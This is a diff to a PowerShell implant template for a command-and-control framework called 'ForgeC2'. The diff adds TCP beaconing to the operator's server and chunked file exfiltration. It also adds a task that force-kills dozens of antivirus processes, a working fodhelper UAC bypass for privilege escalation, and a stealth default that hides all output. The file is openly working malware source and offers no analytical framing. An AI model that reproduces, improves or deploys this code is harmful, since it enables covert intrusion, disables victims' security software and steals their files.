@@ -12,12 +12,17 @@ $global:Interval = {{.Interval}}
 $global:Jitter = {{.Jitter}}
 $global:UserAgent = "{{.UserAgent}}"
 $global:Persist = {{if .Persist}}$true{{else}}$false{{end}}
+$global:Protocol = "{{.Protocol}}"
+$global:BeaconURI = "{{.BeaconURI}}"
+$global:BeaconMethod = "{{.Method}}"
+$global:ListenerID = {{if .ListenerID}}{{.ListenerID}}{{else}}0{{end}}
 
 $global:AgentUUID = $null
 $global:ResultsQueue = @()
 $global:FastMode = $false
 $global:FastInterval = 1
 $global:ScreenStreaming = $false
+$global:Debug = $false  # set to $true only for debugging builds (stealth default)
 
 {{if .SkipTLSVerify}}
 # Ignore SSL certificate errors (compatible with Windows PowerShell 5.1 and PowerShell Core)
@@ -53,7 +58,7 @@ function Get-SystemInfo {
     $username = [Convert]::ToBase64String($utf8.GetBytes($username))
     $ip = [Convert]::ToBase64String($utf8.GetBytes($ip))
     
-    return @{hostname=$hostname;username=$username;os=$os;arch=$arch;ip=$ip;encoding="base64"}
+    return @{hostname=$hostname;username=$username;os=$os;arch=$arch;ip=$ip;encoding="base64";listener_id="$global:ListenerID"}
 }
 
 function Add-Persistence {
@@ -82,38 +87,42 @@ function Sleep-Jitter {
 function Send-Beacon {
     param($bodyJson)
     try {
-        $uri = [System.Uri]$global:C2URL
+        $addr = $global:C2URL -replace '^tcp://','' -replace '^tls://',''
+        $parts = $addr.Split(':')
+        $host = $parts[0]
+        $port = [int]$parts[1]
+
         $client = New-Object System.Net.Sockets.TcpClient
-        $client.Connect($uri.Host, $uri.Port)
+        $client.Connect($host, $port)
         $stream = $client.GetStream()
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $reader = New-Object System.IO.StreamReader($stream)
-        
-        $request = "POST /api/v1/beacon HTTP/1.1`r`n"
-        $request += "Host: $($uri.Host):$($uri.Port)`r`n"
-        $request += "Content-Type: application/json`r`n"
-        $request += "Content-Length: $($bodyJson.Length)`r`n"
-        $request += "User-Agent: $($global:UserAgent)`r`n"
-        $request += "Connection: close`r`n`r`n"
-        $request += $bodyJson
-        
-        $writer.Write($request)
-        $writer.Flush()
-        
-        $response = ""
-        while ($client.Connected -and ($stream.DataAvailable -or $client.Available -gt 0)) {
-            $response += [char]$stream.ReadByte()
+
+        $bodyBytes = [Text.Encoding]::UTF8.GetBytes($bodyJson)
+        $len = [uint32]$bodyBytes.Length
+        $lenBytes = [BitConverter]::GetBytes($len)
+        # Convert to Big Endian (network order)
+        [Array]::Reverse($lenBytes)
+
+        $stream.Write($lenBytes, 0, 4)
+        $stream.Write($bodyBytes, 0, $bodyBytes.Length)
+        $stream.Flush()
+
+        # Read response length (4 bytes BE)
+        $rlenBuf = New-Object byte[] 4
+        $read = $stream.Read($rlenBuf, 0, 4)
+        if ($read -ne 4) { $client.Close(); return $null }
+        [Array]::Reverse($rlenBuf)
+        $rlen = [BitConverter]::ToUInt32($rlenBuf, 0)
+
+        if ($rlen -gt 0 -and $rlen -lt 16MB) {
+            $rbuf = New-Object byte[] $rlen
+            $stream.Read($rbuf, 0, $rlen) | Out-Null
+            $jsonText = [Text.Encoding]::UTF8.GetString($rbuf)
+            if ($jsonText) {
+                $client.Close()
+                return $jsonText | ConvertFrom-Json
+            }
         }
-        
-        $writer.Close()
-        $reader.Close()
-        $stream.Close()
         $client.Close()
-        
-        if ($response -match "\r?\n\r?\n(.*)$") {
-            $jsonBody = $matches[1].Trim()
-            if ($jsonBody) { return $jsonBody | ConvertFrom-Json }
-        }
         return $null
     } catch { return $null }
 }
@@ -122,10 +131,13 @@ function Send-Beacon {
     param($bodyJson)
     try {
         $headers = @{"Content-Type"="application/json"; "User-Agent"=$global:UserAgent}
-        $resp = Invoke-RestMethod -Uri ($global:C2URL + "/api/v1/beacon") -Method Post -Body $bodyJson -Headers $headers -ErrorAction Stop
+        $uri = $global:C2URL + $global:BeaconURI
+        if (-not $global:BeaconURI) { $uri = $global:C2URL + "/api/v1/beacon" }
+        $method = if ($global:BeaconMethod) { $global:BeaconMethod } else { "Post" }
+        $resp = Invoke-RestMethod -Uri $uri -Method $method -Body $bodyJson -Headers $headers -ErrorAction Stop
         return $resp
     } catch {
-        Write-Host "[!] Beacon error: $_"
+        if ($global:Debug) { Write-Host "[!] Beacon error: $_" }
         return $null
     }
 }
@@ -133,9 +145,15 @@ function Send-Beacon {
 
 function Send-ScreenFrame {
     param($data)
+    if ($global:Protocol -eq "tcp" -or $global:C2URL -notlike "http*") {
+        # For pure TCP mode, screen frames require separate HTTP channel or future multiplex
+        return
+    }
     try {
         $body = @{uuid=$global:AgentUUID; data=$data} | ConvertTo-Json -Compress
-        Invoke-RestMethod -Uri ($global:C2URL + "/api/v1/screen_frame") -Method Post -Body $body -Headers @{"Content-Type"="application/json"} -ErrorAction Stop | Out-Null
+        $screenUri = $global:C2URL + "/api/v1/screen_frame"
+        if ($global:BeaconURI -and $global:BeaconURI -ne "/api/v1/beacon") { $screenUri = $global:C2URL + $global:BeaconURI + "_screen" } # simplistic
+        Invoke-RestMethod -Uri $screenUri -Method Post -Body $body -Headers @{"Content-Type"="application/json"} -ErrorAction Stop | Out-Null
     } catch {}
 }
 
@@ -265,25 +283,27 @@ function Execute-Task {
                 }
             }
             "upload" {
-                # Two modes:
-                # 1. Server pushes file (Data or Shell contains base64 data, Path or Command = target path)
-                # 2. Agent exfils file (no Data/Shell, Path or Command = path to read)
+                # Chunked support: Path = target, Data/Shell = b64 chunk, Offset for position
                 $path = $task.path
                 if (-not $path) { $path = $task.command }
                 $b64 = $task.data
                 if (-not $b64) { $b64 = $task.shell }
+                $offset = $task.offset
                 if ($b64) {
-                    # push from operator
                     try {
                         $bytes = [Convert]::FromBase64String($b64)
-                        [System.IO.File]::WriteAllBytes($path, $bytes)
-                        $result.output = "File written to: $path"
+                        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::OpenOrCreate, [System.IO.FileAccess]::Write)
+                        if ($offset -gt 0) { $fs.Seek($offset, [System.IO.SeekOrigin]::Begin) | Out-Null }
+                        $fs.Write($bytes, 0, $bytes.Length)
+                        $fs.Close()
+                        $result.output = "Chunk written at offset $offset"
                         $result.path = $path
+                        $result.offset = $offset
+                        $result.size = $bytes.Length
                     } catch {
-                        $result.error = "Upload (write) failed: $_"
+                        $result.error = "Upload chunk failed: $_"
                     }
                 } else {
-                    # exfil to server
                     $filePath = $path
                     if (-not $filePath) {
                         $result.error = "File path required"
@@ -292,21 +312,31 @@ function Execute-Task {
                             if (-not (Test-Path $filePath)) {
                                 $result.error = "File not found: $filePath"
                             } else {
-                                $bytes = [System.IO.File]::ReadAllBytes($filePath)
-                                $result.output = [Convert]::ToBase64String($bytes)
-                                $result.filename = (Split-Path $filePath -Leaf)
-                                $result.size = $bytes.Length
+                                $fs = [System.IO.File]::Open($filePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+                                $offset = $task.offset
+                                $size = $task.size
+                                if ($size -eq 0) { $size = 1MB }
+                                if ($offset -gt 0) { $fs.Seek($offset, [System.IO.SeekOrigin]::Begin) | Out-Null }
+                                $buf = New-Object byte[] $size
+                                $read = $fs.Read($buf, 0, $size)
+                                $fs.Close()
+                                $chunk = $buf[0..($read-1)]
+                                $result.output = [Convert]::ToBase64String($chunk)
                                 $result.encoding = "base64"
+                                $result.path = $filePath
+                                $result.offset = $offset
+                                $result.size = $read
+                                $result.filename = (Split-Path $filePath -Leaf)
                             }
                         } catch {
-                            $result.error = "Upload (read) failed: $_"
+                            $result.error = "Upload (read chunk) failed: $_"
                         }
                     }
                 }
             }
             "download" {
                 if ($task.command -like "http*") {
-                    # URL download: Command = url, Shell or Path = destPath
+                    # URL download
                     $fileUrl = $task.command
                     $destPath = $task.shell
                     if (-not $destPath) { $destPath = $task.path }
@@ -322,21 +352,30 @@ function Execute-Task {
                         $result.error = "Download failed: $_"
                     }
                 } else {
-                    # Local file exfil
+                    # Local file exfil chunk
                     $filePath = $task.path
                     if (-not $filePath) { $filePath = $task.command }
                     if (-not $filePath) {
                         $result.error = "File path required"
                     } else {
                         try {
-                            $bytes = [System.IO.File]::ReadAllBytes($filePath)
-                            $result.output = [Convert]::ToBase64String($bytes)
-                            $result.filename = (Split-Path $filePath -Leaf)
-                            $result.size = $bytes.Length
+                            $fs = [System.IO.File]::Open($filePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+                            $offset = $task.offset
+                            $size = $task.size
+                            if ($size -eq 0) { $size = 1MB }
+                            if ($offset -gt 0) { $fs.Seek($offset, [System.IO.SeekOrigin]::Begin) | Out-Null }
+                            $buf = New-Object byte[] $size
+                            $read = $fs.Read($buf, 0, $size)
+                            $fs.Close()
+                            $chunk = $buf[0..($read-1)]
+                            $result.output = [Convert]::ToBase64String($chunk)
                             $result.encoding = "base64"
                             $result.path = $filePath
+                            $result.offset = $offset
+                            $result.size = $read
+                            $result.filename = (Split-Path $filePath -Leaf)
                         } catch {
-                            $result.error = "Download (exfil) failed: $_"
+                            $result.error = "Download (exfil chunk) failed: $_"
                         }
                     }
                 }
@@ -386,6 +425,61 @@ public class ForgeDpi {
             "screen_stream_stop" {
                 $global:ScreenStreaming = $false
                 $result.output = "screen stream stopped"
+            }
+            "keylogger_start" {
+                $result.output = "keylogger is only supported on Go agents (EXE / Linux ELF). Generate a Windows EXE agent to use it."
+            }
+            "keylogger_stop" {
+                $result.output = "keylogger is only supported on Go agents (EXE / Linux ELF)."
+            }
+            "keylogger_dump" {
+                $result.output = "keylogger is only supported on Go agents (EXE / Linux ELF)."
+            }
+            "suspend" {
+                $result.output = "suspend/resume native only on Go agents. Use shell with custom code or generate EXE agent."
+            }
+            "resume" {
+                $result.output = "suspend/resume native only on Go agents. Use shell with custom code or generate EXE agent."
+            }
+            "kill_av" {
+                $avProcs = @("MsMpEng","NisSrv","avastsvc","avastui","avgui","avgsvc","bdagent","vsserv","egui","ekrn","avp","avpui","mcdetect","mcshield","ns","ccSvcHst","smc","rtvscan",
+                    "360sd","360tray","360rp","360safe","360rps","360se",
+                    "QQPCMgr","TSService","TSKiller","QQPCRealTimeSpeedup",
+                    "HrMain","HrTray","HipsTray","HipsService",
+                    "RsMain","RsTray","rstray","RsAgent",
+                    "kxescore","kxetray","kxescan","kxe",
+                    "BaiduSdSvc","BaiduAnSvc","baidusdtray",
+                    "2345Safe","2345Explorer","2345SafeSvc")
+                foreach ($p in $avProcs) { Stop-Process -Name $p -Force -ErrorAction SilentlyContinue }
+                $result.output = "attempted to kill AV processes via PS"
+            }
+            "elevate" {
+                # UAC bypass attempt via common methods (fodhelper etc.)
+                $cmd = $task.command
+                if (-not $cmd) { $cmd = "cmd.exe" }
+                try {
+                    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+                    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
+                    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd
+                    Start-Process "fodhelper.exe" -WindowStyle Hidden
+                    Start-Sleep 2
+                    Remove-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Recurse -Force -ErrorAction SilentlyContinue
+                    $result.output = "UAC bypass (fodhelper) attempted for: $cmd"
+                } catch {
+                    $result.output = "elevate failed: $_ (try manual UAC or other methods)"
+                }
+            }
+            "creds" {
+                $result.output = "creds dumping (SAM/LSASS) is best on Go EXE agent. Use 'reg save' or comsvcs in shell, or generate Windows EXE."
+            }
+            "inject" {
+                $result.output = "Process injection only in native Go EXE agent. Use powershell reflective or generate EXE."
+            }
+            "lateral" {
+                $result.output = "Lateral movement (psexec/winrm/wmi) via shell recommended. EXE agent has dedicated module."
+            }
+            "socks" {
+                $result.output = "SOCKS5 proxy start only supported in Go EXE agent for pivoting."
             }
             default { $result.error = "Unknown task type: $($task.type)" }
         }
@@ -472,7 +566,9 @@ function Continue-Screenshot-Loop {
 }
 
 # ============ MAIN ============
-Write-Host "[ForgeC2] PowerShell Agent starting..." -ForegroundColor Cyan
+if ($global:Debug) {
+    Write-Host "[ForgeC2] PowerShell Agent starting..." -ForegroundColor Cyan
+}
 
 Add-Persistence
 
@@ -484,8 +580,10 @@ if (Test-Path $uuidFile) {
     [IO.File]::WriteAllText($uuidFile, $global:AgentUUID) 
 }
 
-Write-Host "[*] Agent UUID: $global:AgentUUID" -ForegroundColor Green
-Write-Host "[*] C2: $global:C2URL | Interval: $($global:Interval)s | Jitter: $($global:Jitter)%" -ForegroundColor DarkGray
+if ($global:Debug) {
+    Write-Host "[*] Agent UUID: $global:AgentUUID" -ForegroundColor Green
+    Write-Host "[*] C2: $global:C2URL | Interval: $($global:Interval)s | Jitter: $($global:Jitter)%" -ForegroundColor DarkGray
+}
 
 while ($true) {
     Do-Beacon
